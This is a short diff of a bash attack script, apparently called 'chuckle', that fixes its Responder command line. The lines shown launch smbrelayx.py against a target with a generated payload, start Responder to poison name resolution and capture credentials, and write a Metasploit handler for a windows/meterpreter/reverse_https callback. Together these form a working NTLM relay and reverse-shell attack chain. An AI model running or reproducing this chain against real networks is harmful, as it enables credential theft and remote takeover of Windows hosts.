@@ -56,10 +56,10 @@ echo "Payload created: $payload"
 echo "Starting SMBRelayX..."
 smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
 echo "Stating Responder..."
+#Old responder
 #responder -i $lhost -wrfF >>chuckle.log &
 #Fix for new responder options.
-responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}'
-) -wrfF >>chuckle.log &
+responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}') -wrfF >>chuckle.log &
 echo "Setting up listener..."
 echo "use exploit/multi/handler" > chuckle.rc
 echo "set payload windows/meterpreter/reverse_https" >> chuckle.rc
